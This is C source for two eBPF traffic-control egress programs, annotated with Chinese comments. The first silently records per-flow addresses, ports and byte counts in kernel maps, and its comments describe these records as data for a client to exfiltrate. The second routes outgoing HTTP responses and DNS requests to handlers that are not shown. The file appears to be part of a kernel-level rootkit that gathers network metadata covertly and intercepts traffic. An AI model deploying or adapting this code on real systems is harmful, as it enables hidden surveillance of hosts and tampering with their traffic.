/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _TC_H_
#define _TC_H_

//该ebpf程序将被挂载到linux TC子系统的出口(egress)分类器(classifier)上
//分类器分为入站分类器(ingress classifier)和出站分类器(egress classifier)
SEC("classifier/egress")
int egress(struct __sk_buff *skb)
{
    struct cursor c;
    struct pkt_ctx_t pkt;

    //这个函数是干什么的？
    tc_cursor_init(&c, skb);
    //解析以太网头部
    if (!(pkt.eth = parse_ethhdr(&c))) {
        return TC_ACT_OK;
    }

    // we only support IPv4 for now
    if (pkt.eth->h_proto != htons(ETH_P_IP)) {
        return TC_ACT_OK;
    }

    //解析ipv4头部
    if (!(pkt.ipv4 = parse_iphdr(&c))) {
        return TC_ACT_OK;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP://解析tcp头部
            if (!(pkt.tcp = parse_tcphdr(&c))) {
                return TC_ACT_OK;
            }
            break;

        case IPPROTO_UDP://解析udp头部
            if (!(pkt.udp = parse_udphdr(&c))) {
                return TC_ACT_OK;
            }
            break;

        default:
            return TC_ACT_OK;
    }

    // generate flow
    struct flow_t flow = {
        .data = {
            .saddr = pkt.ipv4->saddr,//源地址
            .daddr = pkt.ipv4->daddr,//目的地址
            .flow_type = EGRESS_FLOW,//流量类型，egress
        },
    };
    if (pkt.ipv4->protocol == IPPROTO_TCP) {
        flow.data.source_port = htons(pkt.tcp->source);//源端口
        flow.data.dest_port = htons(pkt.tcp->dest);//目的端口
    } else if (pkt.ipv4->protocol == IPPROTO_UDP) {
        flow.data.source_port = htons(pkt.udp->source);//源端口
        flow.data.dest_port = htons(pkt.udp->dest);//目的端口
    } else {
        return TC_ACT_OK;
    }

    // select flow counter
    // 在network_flows中查找会话流是否存在
    // 在network_flows中查找会话流是否存在，如果不存在则生成新的entry
    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // 这是个新的流，生成新的entry
        u32 key = 0;
        u32 *next_key = bpf_map_lookup_elem(&network_flow_next_key, &key);
        if (next_key == NULL) {
            // should never happen
            return TC_ACT_OK;
        }

        // check if we should loop back to the first entry
        if (*next_key == MAX_FLOW_COUNT) {
            // 如果当前next_key是MAX_FLOW_COUNT，那么就循环回第一个entry
            *next_key = 0;
        } else if (*next_key == MAX_FLOW_COUNT + 1) {
            // 如果当前next_key是MAX_FLOW_COUNT + 1，那么就忽略新的流，直到客户端将所收集的数据exfiltrate出去
            return TC_ACT_OK;
        } else if (*next_key > MAX_FLOW_COUNT + 1) {
            // should never happen
            return TC_ACT_OK;
        }

        // delete previous flow counter at next_key
        // 在network_flow_keys中删除当前next_key对应的流
        struct flow_t *prev_flow = bpf_map_lookup_elem(&network_flow_keys, next_key);
        if (prev_flow != NULL) {
            bpf_map_delete_elem(&network_flows, prev_flow);
            bpf_map_delete_elem(&network_flow_keys, next_key);
        }

        // set flow counter for provided key
        // 在network_flows中为当前next_key设置新的流counter
        struct network_flow_counter_t new_counter = {};
        bpf_map_update_elem(&network_flows, &flow, &new_counter, BPF_ANY);

        // set the flow in the network_flow_keys for exfiltration
        // 在network_flow_keys中添加当前流，以便客户端exfiltrate出去
        bpf_map_update_elem(&network_flow_keys, next_key, &flow, BPF_ANY);
        *next_key += 1;
    }

    //获取当前流对应的计数器
    counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // should never happen
        return TC_ACT_OK;
    }

    // add packet length to counter
    if (pkt.ipv4->protocol == IPPROTO_TCP) {
        counter->data.tcp_count = counter->data.tcp_count + htons(pkt.ipv4->tot_len);
    } else if (pkt.ipv4->protocol == IPPROTO_UDP) {
        counter->data.udp_count = counter->data.udp_count + htons(pkt.ipv4->tot_len);
    }
    //调用bpf_tail_call将数据包传递给下一个tc程序，继续数据包的传输过程
    bpf_tail_call(skb, &tc_progs, TC_DISPATCH);
    return TC_ACT_OK;
}
//在数据包已经通过 egress 路径的所有处理,并最终将被发送到网络设备驱动程序之前。
SEC("classifier/egress_dispatch")
int egress_dispatch(struct __sk_buff *skb)
{
    struct cursor c;
    struct pkt_ctx_t pkt;

    tc_cursor_init(&c, skb);
    if (!(pkt.eth = parse_ethhdr(&c)))
        return TC_ACT_OK;

    // we only support IPv4 for now
    if (pkt.eth->h_proto != htons(ETH_P_IP))
        return TC_ACT_OK;

    if (!(pkt.ipv4 = parse_iphdr(&c)))
        return TC_ACT_OK;

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            // 解析 TCP 头部，并检查源端口是否匹配 HTTP 服务器端口
            if (!(pkt.tcp = parse_tcphdr(&c)) || pkt.tcp->source != htons(load_http_server_port()))
                return TC_ACT_OK;
        
            // 注释掉的调试信息，用于打印 TCP 序列号和确认号
            // bpf_printk("OUT - SEQ:%x ACK_NO:%x ACK:%d\n", ...)
            // bpf_printk("      len: %d\n", ...)
        
            // 调整游标位置，跳过 TCP 选项
            c.pos += (pkt.tcp->doff << 2) - sizeof(struct tcphdr);
            // 处理 HTTP 响应
            return handle_http_resp(skb, &c, &pkt);

        case IPPROTO_UDP:
            // 解析 UDP 头部，并检查目标端口是否是 DNS 端口(53)
            if (!(pkt.udp = parse_udphdr(&c)) || pkt.udp->dest != htons(DNS_PORT))
                return TC_ACT_OK;
        
            // 处理 DNS 请求
            return handle_dns_req(skb, &c, &pkt);
    }

    return TC_ACT_OK;
};

#endif
